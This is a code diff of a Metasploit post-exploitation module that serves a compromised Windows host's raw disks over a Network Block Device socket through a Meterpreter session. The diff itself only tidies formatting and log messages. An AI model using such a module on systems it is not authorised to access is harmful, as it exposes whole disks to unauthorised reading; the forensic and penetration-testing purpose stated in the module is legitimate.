@@ -10,17 +10,17 @@
 #    http://msu-nftc.org
 
 class Metasploit3 < Msf::Post
-	
+
 	def initialize(info={})
 		super( update_info( info,
-			'Name'          => 'Local NBD server for remote disks',
-			'Description'   => %q{Maps remote disks and logical volumes to a local Network Block 
+			'Name'          => 'Local NBD Server for Remote Disks',
+			'Description'   => %q{Maps remote disks and logical volumes to a local Network Block
 				Device server. Allows for forensic tools to be executed on the remote disk directly.},
 			'License'       => MSF_LICENSE,
 			'Version'       => '$Revision$',
 			'Platform'      => ['windows'],
 			'SessionTypes'  => ['meterpreter'],
-			'Author'        => ['Wesley McGrew <wesley@mcgrewsecurity.com>']
+			'Author'        => ['Wesley McGrew <wesley[at]mcgrewsecurity.com>']
 		))
 		register_options(
 			[
@@ -53,17 +53,17 @@ class Metasploit3 < Msf::Post
 		end
 		geometry = ioctl['lpOutBuffer']
 		disk_size = geometry[24,31].unpack('Q')[0]
-		
+
 		socket = Rex::Socket::TcpServer.create({'LocalHost'=>ip_addr,'LocalPort'=>port})
 		print_status("Listening on #{ip_addr}:#{port}")
 		print_status("Serving #{devname} (#{disk_size} bytes)")
 		rsock = socket.accept()
 		print_status("Accepted a connection")
-		
+
 		# Negotiation
 		rsock.put('NBDMAGIC')
 		rsock.put("\x00\x00\x42\x02\x81\x86\x12\x53")
-	
+
 		rsock.put([disk_size].pack("Q").reverse)
 		rsock.put("\x00\x00\x00\x03")  # Read-only
 		rsock.put("\x00"*124)
@@ -72,16 +72,16 @@ class Metasploit3 < Msf::Post
 		while true
 			request = rsock.read(28)
 			magic, request, nbd_handle, offset_n, length = request.unpack("NNa8a8N")
-	
+
 			if magic != 0x25609513
-				print_status("Wrong magic number")
+				print_error("Wrong magic number")
 				break
 			end
 			if request == 2
 				break
 			end
 			if request == 1
-				print_status("Attempted write on a read-only nbd")
+				print_error("Attempted write on a read-only nbd")
 				break
 			end
 			if request == 0
@@ -101,3 +101,4 @@ class Metasploit3 < Msf::Post
 		client.railgun.kernel32.CloseHandle(handle)
 	end
 end
+
